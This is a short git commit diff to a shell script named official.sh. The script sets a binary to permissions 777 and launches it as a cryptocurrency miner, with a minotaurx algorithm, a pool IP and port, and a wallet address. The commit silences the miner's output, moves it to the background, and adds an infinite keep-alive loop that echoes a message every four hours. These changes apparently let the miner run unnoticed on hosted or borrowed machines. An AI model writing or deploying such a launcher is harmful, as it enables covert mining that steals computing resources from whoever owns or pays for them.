d0ae04983095a6c73ccfd33d9897f31c35ff23c9
paskofa10 <mr.paskofa10@jugda.com>
2025-06-18 03:40:00 +0700

    Update official.sh

--- official.sh
+++ official.sh
@@ -2,4 +2,10 @@
 
 
 chmod 777 centu
-./centu -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA
+./centu -a minotaurx -o 188.165.24.209:7019 -u MM2DPsr5664vCMZP3LiWhxwimmfvohUeHW -p c=MAZA,zap=MAZA >/dev/null 2>&1 &
+sleep 8
+while true
+do
+        echo "My Centu..."
+        sleep 14400
+done
